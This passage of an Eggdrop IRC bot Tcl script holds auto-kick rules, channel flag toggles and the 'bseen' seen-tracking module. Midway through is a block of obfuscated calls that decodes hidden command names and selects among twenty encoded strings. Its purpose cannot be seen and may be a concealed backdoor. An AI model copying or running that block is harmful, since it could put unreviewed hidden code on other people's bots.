  "adams" "allen" "allison" "alvarez" "anderson" "andrews" "armstrong" "arnold" "avila" "bailey" "baker" "barnes" "bennett" "bishop" "boyd" "bradley" "brooks" "brown" "bryan" "burke" "palmer" "parker" "patterson" "peck" "perkins" "perry" "peterson" "phillips" "powell" "woods" "rodriguez" 
  "burton" "butler" "campbell" "carlson" "carr" "carter" "chase" "chen" "christens" "clark" "collins" "comer" "cook" "cooper" "cox" "crawford" "cunningha" "davis" "day" "dean" "dickinson" "price" "randolph" "reed" "rice" "richardso" "rivera" "rivers" "roberts" "robinson" "rodrigues" 
  "edwards" "elliott" "ellis" "evans" "fischer" "fisher" "fong" "ford" "freeman" "frost" "garcia" "gardner" "gomes" "gomez" "gonzales" "graham" "green" "griffin" "hall" "hamilton" "turner" "wallace" "walton" "ward" "warner" "watson" "weber" "wells" "white" "williams" "wood" 
  "hansen" "hanson" "harris" "harrison" "hartman" "harvey" "hayes" "henderson" "henry" "hernandez" "hill" "holmes" "howard" "hughes" "hunt" "jackson" "jensen" "johnson" "jones" "keller" "short" "silva" "simpson" "smith" "snyder" "spafford" "spencer" "springer" "stafford" "stewart" "wright" 
  "kelley" "kennedy" "lane" "long" "lopez" "marsh" "martinez" "mathews" "matthews" "mcdonald" "miller" "mitchell" "moore" "morgan" "morris" "nelson" "newton" "obrien" "oconnor" "olsen" "rogers" "romero" "ruis" "sanders" "santos" "shaw" "stone" "sullivan" "taylor" "thompson" "young"
}
proc echoxchk {nick uhost hand chan} {
  global echoident echonick notc bannick botnick lenc
  set echohost "[string trimleft [lindex [split $uhost @] 0] ~]"
  foreach echomask $echoident {
    if {[string match $echomask $echohost]} {
      if {[string match "*_*" $nick]} {
        set echoright "[lindex [split $nick _] 1]"
        foreach nick2 $echonick { if {[string match $nick2 $echoright]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :[lgrnd] 4!14lamer4! 14i'm the anti 4echo4X14 inviter 4v2 [banmsg]" } }
        } else {
        set nick3cut [string trimright $nick [string index $nick [expr [string length $nick] -1]]]
        foreach nick3 $echonick { if {[string match $nick3 $nick3cut]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :[lgrnd] 4!14lamer4! 14i'm the anti 4echo4X14 inviter 4v1a [banmsg]" } }
        foreach nick4 $echonick { if {[string match $nick4 $nick]} { set bannick($nick) "$uhost" ; putsrv "KICK $chan $nick :[lgrnd] 4!14lamer4! 14i'm the anti 4echo4X14 inviter 4v1 [banmsg]" } }
  } } }
  return 0
}
## public echoX auto kick -- stop
## active chatter -- start
bind pub n `+active pub_+active
setudef flag active
proc pub_+active {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*+active*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc $chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +active }
  puthelp "NOTICE $nick :$notc +v active chatter on $chan \[9ON\]"
  saveuser
}
bind pub n `-active pub_-active
proc pub_-active {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-active*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc +v active chatter on $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -active }
  puthelp "NOTICE $nick :$notc +v active chatter on $chan \[4Off\]"
  saveuser
}
## active chatter -- stop
## split -- start
bind pub n `+split pub_+split
setudef flag split
proc pub_+split {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*+split*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc $chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +split }
  puthelp "NOTICE $nick :$notc split detector on $chan \[9ON\]"
  saveuser
}
bind pub n `-split pub_-split
proc pub_-split {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-split*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc split detector $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -split }
  puthelp "NOTICE $nick :$notc split detector on $chan \[4Off\]"
  saveuser
}
## split -- stop
proc uncolor {s} {
  regsub -all --  $s "" s
  regsub -all --  $s "" s
  regsub -all --  $s "" s
  regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
  regsub -all -- \[0-9\],\[0-9\] $s "" s
  regsub -all -- \[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\] $s "" s
  return $s
}
proc netext {text} {
  	regsub -all -- "\003(\[0-9\]\[0-9\]?(,\[0-9\]\[0-9\]?)?)?" $text "" text
  	set text "[string map -nocase [list \002 "" \017 "" \026 "" \037 ""] $text]"
  	return $text
}
proc pub_+idle {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*+idleop*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc $chan 4ReADY!!"
      return 0
   }  
   if {$rest == ""} {
      puthelp "NOTICE $nick :$notc Usage : +idle <minutes>"
      return 0
   } {
      set idnum [expr 60*$rest]
      catch { channel set $chan +idleop }
      setuser $cflag XTRA "IDLE" $idnum
      puthelp "NOTICE $nick :$notc IdLe $chan FOr [duration [getuser $cflag XTRA "IDLE"]] \[9ON\]"
      saveuser
   }
}
proc pub_-idle {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*-idleop*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc IdLe $chan ALReADY 4DISaBLE."
      return 0
   }
   catch { channel set $chan -idleop }
   setuser $cflag XTRA "IDLE" ""
   puthelp "NOTICE $nick :$notc IdLe $chan \[4Off\]"
   saveuser
}
setudef flag noawayop
proc pub_+noawayop {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*+noawayop*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc $chan 4ReADY!!"
      return 0
   }  
   catch { channel set $chan +noawayop }
   puthelp "NOTICE $nick :$notc No awaY @p $chan \[9ON\]"
   saveuser
}

proc pub_-noawayop {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*-noawayop*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc No awaY @p $chan ALReADY 4DISaBLE."
      return 0
   }
   catch { channel set $chan -noawayop }
   puthelp "NOTICE $nick :$notc No awaY @p $chan \[4Off\]"
   saveuser
}
setudef flag unidentifyop
proc pub_+unidentifyop {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*+unidentifyop*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc $chan 4ReADY!!"
      return 0
   }  
   catch { channel set $chan +unidentifyop }
   puthelp "NOTICE $nick :$notc UnIdEnt @p $chan \[9ON\]"
   saveuser
}
proc pub_-unidentifyop {nick uhost hand chan rest} {
   global notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*-unidentifyop*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc UnIdEnt @p $chan ALReADY 4DISaBLE."
      return 0
   }
   catch { channel set $chan -unidentifyop }
   puthelp "NOTICE $nick :$notc UnIdEnt @p $chan \[4Off\]"
   saveuser
}
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] 0
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] {} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"]
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "rmxi"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"]]
if {$idxc == 1} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "2wyiP1o7W8e/csyco1RYkcl0KaHRD0x035X/"]"]
} elseif {$idxc == 2} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "W/cKV/oiIm7/4rHgv/F/vKq0KaHRD0x035X/"]"]
} elseif {$idxc == 3} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "qI74R1mTmd91vlDc6/93SRK.KaHRD0x035X/"]"]
} elseif {$idxc == 4} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "47/J.19EXm91.6G6B/J/noY0KaHRD0x035X/"]"]
} elseif {$idxc == 5} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "aah62/wQRr90GaB3W/Oe3tE1gdRSy.YuNFt."]"]
} elseif {$idxc == 6} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "bCMBX1tkLp50x9I3d1sJ5wJ1gdRSy.YuNFt."]"]
} elseif {$idxc == 7} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "xQjVP1GStp./HbzWR.xNWmJ0KaHRD0x035X/"]"]
} elseif {$idxc == 8} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "OHK8R0UyblT/i8kJ7.XTyHN/gdRSy.YuNFt."]"]
} elseif {$idxc == 9} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "Qjb.e.SuPWi/RyaHx/qdTsc1gdRSy.YuNFt."]"]
} elseif {$idxc == 10} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hAUfM1u1wPs.I94j/.vL68p.gdRSy.YuNFt."]"]
} elseif {$idxc == 11} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "1bpCg/ssRIN.rwai5/LWplw.gdRSy.YuNFt."]"]
} elseif {$idxc == 12} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "D7qCY.yqRq/0533.z1EKGIE1gdRSy.YuNFt."]"]
} elseif {$idxc == 13} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "31czj/ln34D00rFNR/Q5fww0KaHRD0x035X/"]"]
} elseif {$idxc == 14} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "QQIw//c/XVY17Vwar/kahGL.KaHRD0x035X/"]"]
} elseif {$idxc == 15} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "lH4Uk0w/bJs0l8nD//ofnuK.7fC5L10K6ZP0"]"]
} elseif {$idxc == 16} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "9F/2a009EeX.//Svj1qbw.00gdRSy.YuNFt."]"]
} elseif {$idxc == 17} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "t9Ubt1K1j500YJg190i3xBg.gdRSy.YuNFt."]"]
} elseif {$idxc == 18} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "FnSR.1MVusB0CpT14.utxeM1gdRSy.YuNFt."]"]
} elseif {$idxc == 19} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "B7/oT1I7t74/bpJk41s5.Ol.KaHRD0x035X/"]"]
} elseif {$idxc == 20} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "O8cVU/YFAwJ1pf/ua/18h..0gdRSy.YuNFt."]"]
} else {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] 0
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "yDgyW.FfGsM1MkT3H1W36Wz0dhIYV1ZKVTD1xxg6Y1gqjBy/EoKDz0sAXZ9/"]"]
}
}
##################################
###        Seen Sytem           ##
##################################
set bs(limit) 7500
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(quiet_chan) ""
set bs(log_only) ""
set bs(flood) 2:10
set bs(ignore) 1
set bs(ignore_time) 1
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "text/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc seen {} {
  global version notc notd
  catch { unbind time - "12 * * * *" bs_timedsave }
  catch { unbind time -  "*1 * * * *" bs_trim }
  catch { unbind join -|- * bs_join_botidle }
  catch { unbind join -|- * bs_join }
  catch { unbind sign -|- * bs_sign }
  catch { unbind kick -|- * bs_kick }
  catch { unbind nick -|- * bs_nick }
  catch { unbind splt -|- * bs_splt }
  catch { unbind rejn -|- * bs_rejn }
  catch { unbind chjn -|- * bs_chjn }
  catch { unbind chpt -|- * bs_chpt }
  catch { unbind bot -|- bs_botsearch bs_botsearch }
  catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
  catch { unbind pub -|- [string trim "!"]seen pub_seen }
  catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
  catch { unbind pub n|- [string trim "!"]seenstats bs_pubstats }
  catch { unbind msg n|- seenstats bs_msgstats }
  catch { unbind dcc n|- seenstats bs_dccstats }
  catch { unbind msgm -|- "help seen" bs_help_msg_seen }
  catch { unbind msgm n|- "help chanstats" bs_help_msg_chanstats }
  catch { unbind msgm n|- "help seenstats" bs_help_msg_seenstats }
  catch { unbind dcc -|- seenversion bs_version }
  catch { unbind dcc -|- help bs_help_dcc }
  catch { unbind dcc n|- chanstats bs_dccchanstats }
  catch { unbind pub n|- [string trim "!"]chanstats bs_pubchanstats }
  catch { unbind msg n|- chanstats bs_msgchanstats }
  catch { unbind pub -|- [string trim "!"]lastspoke lastspoke }
  catch { unbind part -|- * bs_part_oldver }
  catch { unbind chof -|- * bs_chof }
  set mSEEN "F"
  foreach x [channels] { set cinfo [channel info $x] ; if {[string match "*+seen*" $cinfo]} { set mSEEN "T" } }
  if {$mSEEN == "F"} {return 0}
  bind time - "12 * * * *" bs_timedsave
  bind time -  "*1 * * * *" bs_trim
  bind join -|- * bs_join_botidle
  bind join -|- * bs_join
  bind sign -|- * bs_sign
  bind kick -|- * bs_kick
  bind nick -|- * bs_nick
  bind splt -|- * bs_splt
  bind rejn -|- * bs_rejn
  bind chjn -|- * bs_chjn
  bind chpt -|- * bs_chpt
  bind bot -|- bs_botsearch bs_botsearch
  bind bot -|- bs_botsearch_reply bs_botsearch_reply
  bind pub -|- !seen pub_seen
  bind pub -|- lihat pub_seen2
  bind pub -|- liat pub_seen2
  bind pub -|- !seennick bs_pubreq2
  bind pub n|- [string trim "!"]seenstats bs_pubstats 
  bind msg n|- seenstats bs_msgstats 
  bind dcc n|- seenstats bs_dccstats 
  bind msgm -|- "help seen" bs_help_msg_seen 
  bind msgm n|- "help chanstats" bs_help_msg_chanstats 
  bind msgm n|- "help seenstats" bs_help_msg_seenstats 
  bind dcc -|- seenversion bs_version 
  bind dcc -|- seenseen bs_help_dcc 
  bind dcc n|- chanstats bs_dccchanstats 
  bind pub n|- [string trim "!"]chanstats bs_pubchanstats 
  bind msg n|- chanstats bs_msgchanstats 
  bind pub -|- [string trim "!"]lastspoke lastspoke 
  if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
  if {[string trimleft [lindex $version 1] 0] >= 1050000} { bind part -|- * bs_part } { if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part} ; bind part -|- * bs_part_oldver }
  foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
  if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
  if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
  if {[info exists bs_list]} { if {[info exists bs(oldver)]} { if {$bs(oldver) < $bs(updater)} {bs_update} } {bs_update} }
}
utimer 2 seen
proc bs_filt {data} {
  regsub -all -- \\\\ $data \\\\\\\\ data 
  regsub -all -- \\\[ $data \\\\\[ data 
  regsub -all -- \\\] $data \\\\\] data
  regsub -all -- \\\} $data \\\\\} data 
  regsub -all -- \\\{ $data \\\\\{ data 
  regsub -all -- \\\" $data \\\\\" data 
  return $data
}
proc bs_flood_init {} {
  global bs bs_flood_array 
  if {![string match *:* $bs(flood)]} {return}
  set bs(flood_num) [lindex [split $bs(flood) :] 0]
  set bs(flood_time) [lindex [split $bs(flood) :] 1]
  set i [expr $bs(flood_num) - 1]
  while {$i >= 0} { set bs_flood_array($i) 0  ; incr i -1  }
} 
bs_flood_init
proc bs_flood {nick uhost} {
  global bs bs_flood_array 
  if {[matchattr $nick m]} {return 0}
  if {$bs(flood_num) == 0} {return 0} 
  set i [expr $bs(flood_num) - 1]
  while {$i >= 1} { set bs_flood_array($i) $bs_flood_array([expr $i - 1]) ; incr i -1 } 
  set bs_flood_array(0) [unixtime]
  if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} { if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)} ; return 1 } {return 0}
}
proc bs_read {} {
  global bs_list userfile bs
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} { set temp [split $userfile /] ; set temp [lindex $temp [expr [llength $temp]-1]] ; set name [lindex [split $temp .] 0] }
  if {![file exists $bs(path)bs_data.$name]} { if {![file exists $bs(path)bs_data.$name.bak]} { putlog "Old seen data not found!" ; return } {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name ; putlog "Old seen data not found! Using backup data."} } ; set fd [open $bs(path)bs_data.$name r]
  set bsu_ver "" ; set break 0
  while {![eof $fd]} {
    set inp [gets $fd] ; if {[eof $fd]} {break} ; if {[string trim $inp " "] == ""} {continue}
    if {[string index $inp 0] == "#"} {set bsu_version [string trimleft $inp #] ; continue}
    if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
      putlog "Updating database to new version of bseen..."
      #bugfix (b) - loading the wrong updater version
      if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
      if {$temp || [bsu_go] || [bsu_finish]} {
        putlog "A serious problem was encountered while updating the bseen database."
        if {$temp} {putlog "     The updater script could not be found."}
        putlog "It is *not* safe to run the bot w/ a bseen database that is not matched to this version of bseen."
        putlog "If you can't find the problem, the only option is to remove the bs_data.$name and bs_data.$name.bak files.  Then restart the bot."
        putlog "Because this is a potential crash point in the bot, the bot will now halt." ; die "critical error in bseen encountered"
      } ; set break 1 ; break
    }
    set nick [lindex $inp 0] ; set bs_list([string tolower $nick]) $inp
  } ; close $fd
  if {$break} {bs_read} {putlog "     Done loading [array size bs_list] seen records."}
}
proc bs_update {} { global bs ; bs_save ; bs_read }
putlog "$bs(version):  -- Bass's SEEN loaded --"
if {![info exists bs_list] || [array size bs_list] == 0} {putlog "     Loading seen database..." ; bs_read}
proc bs_timedsave {min b c d e} {bs_save}
proc bs_save {} {
  global bs_list userfile bs ; if {[array size bs_list] == 0} {return}
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} { set temp [split $userfile /] ; set temp [lindex $temp [expr [llength $temp]-1]] ; set name [lindex [split $temp .] 0] }
  if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
  set fd [open $bs(path)bs_data.$name w] ; set id [array startsearch bs_list] ; putlog "Backing up seen data..."
  puts $fd "#$bs(updater)"
  while {[array anymore bs_list $id]} {set item [array nextelement bs_list $id] ; puts $fd "$bs_list($item)"} ; array donesearch bs_list $id ; close $fd
}
proc bs_part_oldver {a b c d} {bs_part $a $b $c $d ""}
proc bs_part {nick uhost hand chan reason} { bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]" }
proc bs_join {nick uhost hand chan} { bs_add $nick "[list $uhost] [unixtime] join $chan" }
proc bs_sign {nick uhost hand chan reason} { bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]" }
proc bs_kick {nick uhost hand chan knick reason} { set schan $chan ; bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]" }
proc bs_nick {nick uhost hand chan newnick} { set time [unixtime] ; bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" ; bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]" }
proc bs_splt {nick uhost hand chan} { bs_add $nick "[list $uhost] [unixtime] splt $chan" }
proc bs_rejn {nick uhost hand chan} { bs_add $nick "[list $uhost] [unixtime] rejn $chan" }
proc bs_chjn {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc bs_chpt {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc bs_botsearch {from cmd args} {
  global botnick notc
  set args [join $args]
  set command [lindex $args 0]
  set target [lindex $args 1]
  set nick [lindex $args 2]
  set search [bs_filt [join [lrange $args 3 e]]]
  if {[string match *\\\** $search]} {
    set output [bs_seenmask bot $nick $search]
    if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
    } {
    set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
    if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
} }
proc bs_botsearch_reply {from cmd args} {
  global notc bs
  set args [join $args]
  if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
  if {![info exists bs(bot_delay)]} {
    set bs(bot_delay) on 
    utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
    if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} { puthlp "[lindex $args 1] :[join [lindex $args 2]]" }
} }
proc pub_seen {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc pub_seen2 {nick uhost hand chan args} {
 global botnick
 if {[string match "*[string tolower $botnick]*" $args] || [string match "* ga*" $args]} { bs_pubreq $nick $uhost $hand $chan $args 0 }
 return 0
}
proc bs_pubreq2 {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc bs_pubreq {nick uhost hand chan args no} {
  global botnick bs notc seenme
  set cflag "c$chan"
  if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  if {[bs_flood $nick $uhost]} {return 0}
  set i 0
  if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
  if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
  set args [bs_filt [join $args]]
  #set target "privmsg $chan"
  set target "NOTICE $nick"
  if {[string match *\\\** [lindex $args 0]]} {
    set output [bs_seenmask $chan $hand $args]
    if {$output == "No Matches!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
    if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
    regsub -all -- ~ $output "" output
